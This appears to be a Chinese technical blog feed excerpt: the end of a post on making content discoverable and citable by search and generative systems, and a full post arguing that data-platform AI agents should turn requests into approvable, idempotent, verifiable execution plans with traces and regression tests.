<h2 id="抓取成功和被引用是两个验收层次"><a href="#抓取成功和被引用是两个验收层次" class="headerlink" title="抓取成功和被引用是两个验收层次"></a>抓取成功和被引用是两个验收层次</h2><p>第一层验证技术可发现性：DNS&#x2F;TLS、robots、HTTP 状态、canonical、sitemap、HTML 正文、图片、JSON-LD。用搜索引擎 URL Inspection 或实际抓取查看渲染后页面，不以本地构建成功代替。</p>
<p>第二层验证内容能否被正确回答。准备一组真实问题：作者是谁、主要研究方向是什么、某篇文章对 SSE 断流的判断是什么、DataX 吞吐模型有哪些约束。检查答案是否指向正确页面、有没有把不同年份观点拼错。</p>
<p>搜索和生成式系统的收录不受站点单方面保证。能控制的是开放合规抓取、清晰实体、稳定 URL、原创证据和外部可验证身份。排名与引用只能持续观测，不能承诺“做完 JSON-LD 就一定出现”。</p>
<p>日志可区分 crawler、普通搜索访问和生成式答案 referral，但不把单次命中当权威建立。长期看查询覆盖、被引用页面、品牌词与技术问题的关联、用户停留和后续阅读，更能反映内容是否真的有用。</p>
<h2 id="批量内容更需要编辑门槛"><a href="#批量内容更需要编辑门槛" class="headerlink" title="批量内容更需要编辑门槛"></a>批量内容更需要编辑门槛</h2><p>批量补充主题时，先建问题地图，避免把同一观点换十个标题。每篇要有独立的故障对象、机制、操作边界和验证方法；字数只是最低防线，不是质量目标。</p>
<p>发布前检查标题重复、段落套话、来源时点、链接、图片和日期一致性，再抽样人工阅读。文本去除机械排比和宣传词，并不等于故意写口语；技术专家的个人口吻来自明确取舍、现场判断和知道哪里不能下结论。</p>
<p>如果一篇文章只能复述公开文档，没有自己的工程分析，宁可不发。搜索系统可以找到原文，读者也不需要多一份同质摘要。博客真正形成识别度，是因为长期在同一问题域给出可复用的判断方法。</p>
<p>GEO 最终仍然回到内容事实。让页面易抓取、实体易识别、段落易引用当然重要，但它们只能放大已有信号。技术作者真正能积累的，是每篇文章留下的证据、边界和经得起复查的结论。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://developers.google.com/search/docs/fundamentals/creating-helpful-content">Google Search Central：创建有帮助、可靠、以人为本的内容</a></li>
<li><a href="https://developers.google.com/search/docs/appearance/structured-data/article">Google Search Central：Article 结构化数据</a></li>
<li><a href="https://developers.google.com/search/docs/appearance/structured-data/profile-page">Google Search Central：ProfilePage 结构化数据</a></li>
<li><a href="https://help.openai.com/en/articles/12627856-publishers-and-developers-faq">OpenAI：Publishers and Developers FAQ</a></li>
</ul>
]]></content>
      <categories>
        <category>工程方法</category>
      </categories>
      <tags>
        <tag>GEO</tag>
        <tag>技术写作</tag>
        <tag>结构化数据</tag>
      </tags>
  </entry>
  <entry>
    <title>数据平台 Agent 的终点为什么是可验证执行：会回答还远远不够</title>
    <url>//2026/08/20/data-platform-agent-verifiable-execution/</url>
    <content><![CDATA[<p>数据平台里做一个“能回答任务为什么失败”的 Agent 不难：接入日志、元数据和模型，常见错误能说得像模像样。真正困难的是用户继续说“那你帮我修一下并重跑”，系统还能保持对象正确、权限清楚、执行幂等，并证明数据结果已经恢复。</p>
<p>我认为数据平台 Agent 的终点不是更自然的问答，而是可验证执行。自然语言意图要经过对象解析、证据诊断、变更计划、权限决定、受控操作和结果验收，最终每一步都能回到真实系统核对。</p>
<p class="article-diagram-scroll"><img src="/images/articles/data-platform-agent-verifiable-execution.svg" class="lazyload" data-srcset="/images/articles/data-platform-agent-verifiable-execution.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="数据平台 Agent 可验证执行闭环"></p>
<span id="more"></span>

<h2 id="数据上下文先解决“它说的是谁”"><a href="#数据上下文先解决“它说的是谁”" class="headerlink" title="数据上下文先解决“它说的是谁”"></a>数据上下文先解决“它说的是谁”</h2><p>用户说“订单同步任务”“昨天失败的表”“生产上的客户宽表”，这些都不是稳定对象。Agent 先从目录、调度和资产系统解析 tenant、environment、project、job&#x2F;table ID、version 与业务日期，返回候选和依据。</p>
<p>同名对象、多环境和别名必须显式处理。候选唯一且风险低可以继续；多个候选需要用户选择；生产写操作即使名称唯一，也应展示规范化对象。不能因为 embedding 最相似就默认命中。</p>
<p>元数据不是一次性 prompt 文本。对象 schema、owner、血缘、分区、权限、代码版本和运行状态有各自来源与时间。Context Bundle 保存查询时间、版本和引用，后续计划变化时能判断哪些事实已过期。</p>
<p>Agent 还要知道缺什么。没有表唯一键就不能保证某类去重改写等价，没有完整日志就不能确认根因，没有任务实例 ID 就不能重跑。把信息缺口说出来，比补一个听起来合理的默认值更专业。</p>
<h2 id="诊断从运行证据形成可证伪假设"><a href="#诊断从运行证据形成可证伪假设" class="headerlink" title="诊断从运行证据形成可证伪假设"></a>诊断从运行证据形成可证伪假设</h2><p>任务失败时先关联实例、调度状态、代码、参数、资源、执行引擎日志、SQL plan 和上下游状态。把异常栈中的直接错误与平台转换后的提示分开，保留原始时间窗和版本。</p>
<p>一个 OOM 可能来自数据倾斜、状态无界、并发提高、容器 limit 下降或同节点干扰。Agent 给出假设时要列支持证据、反证和下一步检查。只有在控制变量对照后，才把某一项升级为确认原因。</p>
<p>历史相似案例用于提示检查方向，不能代替当前现场。同样的错误文本在不同引擎版本和任务阶段可能含义不同。检索结果带来源、时间、适用版本，最终判断依赖当前 Run 证据。</p>
<p>对 SQL 或配置修改，先生成 diff 与影响分析：输入输出 schema、分区&#x2F;过滤、NULL 与重复语义、资源估算、血缘下游。能做 EXPLAIN、测试分区和样本对照时先做，不用“语法通过”冒充等价验证。</p>
<h2 id="Plan-是可审批的执行契约"><a href="#Plan-是可审批的执行契约" class="headerlink" title="Plan 是可审批的执行契约"></a>Plan 是可审批的执行契约</h2><p>Agent 把建议转成结构化 Plan：目标对象与版本、前置条件、步骤、工具参数、预期变化、风险、回滚&#x2F;补偿、验证查询和停止条件。每个步骤区分只读、可逆写、不可逆写及外部通知。</p>
<p>审批看到的是规范化 diff，不是自然语言摘要。重跑任务要显示实例、业务日期、依赖策略与是否清理旧产物；改 SQL 要显示精确版本差异；补数据要显示时间范围、并发、输出表和预计资源。</p>
<p>审批绑定 Plan hash、对象 version 和 policy decision。审批后若 Agent 修改参数、对象状态已变化或权限过期，重新校验或审批。不能把“用户同意修复”当整场会话的无限授权。</p>
<p>Plan 可模拟：执行权限检查、资源配额、依赖冲突、SQL plan、安全规则和预期影响，但清楚标明哪些只是静态判断。模拟通过不代表运行一定成功，只减少已知错误。</p>
<h2 id="工具层把自然语言收窄成领域动作"><a href="#工具层把自然语言收窄成领域动作" class="headerlink" title="工具层把自然语言收窄成领域动作"></a>工具层把自然语言收窄成领域动作</h2><p>数据平台 MCP&#x2F;工具不应只暴露万能 SQL 和 shell。更安全的接口是 <code>get_job_instance</code>、<code>fetch_log_window</code>、<code>explain_job</code>、<code>rerun_instance</code>、<code>create_backfill</code>、<code>get_table_schema</code>、<code>submit_job_version</code>，参数使用稳定 ID 与显式环境。接口为什么要这样收窄，可以继续看 <a href="/2025/04/04/mcp-server-narrow-surface/">MCP 工具权限与执行边界</a>。</p>
<p>读写分离，查询工具返回 source&#x2F;version；写工具要求 idempotency key、expected version 和 decision ID。重复提交同一逻辑操作返回已有结果，版本冲突让 Agent重新读取，而不是强制覆盖。</p>
<p>长任务采用 durable operation。提交补数据返回 operation ID，Agent轮询或接收事件；连接断开后继续查同一个操作。状态未知先向调度平台 reconciliation，不再发起第二批相同实例。</p>
<p>工具结果需要领域语义。<code>accepted</code> 只表示调度系统收到了请求，<code>running</code> 表示实例启动，<code>succeeded</code> 仍需数据验收。统一成一个 success 布尔值，会让 Agent 在最关键的边界上提前结束。</p>
<h2 id="验证分运行态、数据态和业务态"><a href="#验证分运行态、数据态和业务态" class="headerlink" title="验证分运行态、数据态和业务态"></a>验证分运行态、数据态和业务态</h2><p>修改发布成功后，先验证配置和代码版本已生效；实例运行层看依赖、资源、进度、重试和终态；数据层核对分区、行数、主键重复、空值、关键聚合和输入输出差异；业务层确认下游消费与口径恢复。</p>
<p>每类任务有 verification contract。重跑不是“实例变绿”就结束：要确认正确业务日期、没有重复产出、下游是否需要触发。SQL 优化不是“耗时下降”就结束：结果集合在明确约束下等价，资源和长尾稳定。</p>
<p>验证查询和阈值在 Plan 阶段确定，避免结果出来后挑有利指标。大表无法全量对照时，使用分区聚合、hash、抽样和独立指标，并说明验证范围。高风险变更先 canary 一个分区或小时间窗。</p>
<p>若验证失败，系统保留修改、运行和结果证据，按预设补偿或停止。不要让 Agent为了达到“成功”自动降低阈值、改验收 SQL 或反复重跑。</p>
<h2 id="每次执行都是评测样本"><a href="#每次执行都是评测样本" class="headerlink" title="每次执行都是评测样本"></a>每次执行都是评测样本</h2><p>Trace 把用户意图、对象解析、context versions、诊断 claims、Plan、审批、工具 Operations 和 verification results 串起来。敏感数据用受控引用，仍要能复现关键决定。<a href="/2025/03/20/agent-trace-decision-owner/">Agent Trace 的责任分层</a> 单独讨论了模型建议、策略授权和真实操作如何拆开记录。</p>
<p>线上评测不只看回答满意度。我关心 object resolution accuracy、evidence-backed diagnosis、unauthorized attempt、duplicate operation、verified success、human correction、recovery time 和 unknown outcome。一个回答很漂亮但重跑错日期，结果应是失败。</p>
<p>人工纠正进入有结构的失败库：对象错、证据不足、计划越界、参数错、工具状态误读、验证漏项。它们生成回归用例，固定工具 fixture 与权限环境后重放。模型、prompt、Skill、工具 schema 任何一层升级都要过同一批边界样本。具体的环境锁定方式见 <a href="/2025/08/04/agent-regression-fixed-environment/">Agent 回归验证</a>。</p>
<p>执行证据还能反哺平台。大量 Agent 都在手工拼同一类日志，说明平台缺统一诊断 API；频繁因同名任务停下，说明元数据标识和搜索要改；验证总靠临时 SQL，说明数据质量契约应产品化。</p>
<p>数据平台为 Agent 提供元数据、运行状态、工具和权限，Agent 则把这些能力组织成用户可理解的工作流。两者结合的价值，不是给旧页面加一个聊天框，而是让一次自然语言请求最终落成有对象、有证据、有边界、可回归验证的执行闭环。</p>
<h2 id="引用信息"><a href="#引用信息" class="headerlink" title="引用信息"></a>引用信息</h2><ul>
<li>作者：邓明瑞 &#x2F; 纯粹（Chuncui）</li>
<li>主题：数据平台与 AI Agent 工程化</li>
<li>核心结论：数据平台 Agent 应把自然语言意图收敛成可授权、可回查、可验收的执行计划。</li>
<li>永久链接：<a href="https://blog.chuncui.icu/2026/08/20/data-platform-agent-verifiable-execution/">https://blog.chuncui.icu/2026/08/20/data-platform-agent-verifiable-execution/</a></li>
<li>专题入口：<a href="/topics/data-platform-agent/">数据平台 × AI Agent：从可信上下文到可验证执行</a></li>
</ul>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://modelcontextprotocol.io/specification/2025-11-25">Model Context Protocol Specification</a></li>
<li><a href="https://openlineage.io/docs/spec/object-model/">OpenLineage Object Model：Run、Job 与 Dataset</a></li>
<li><a href="https://opentelemetry.io/docs/specs/semconv/gen-ai/">OpenTelemetry GenAI Semantic Conventions</a></li>
<li><a href="https://sre.google/workbook/implementing-slos/">Google SRE Workbook：Implementing SLOs</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>数据平台 Agent</tag>
        <tag>可验证执行</tag>
        <tag>智能运维</tag>
      </tags>
  </entry>
</search>
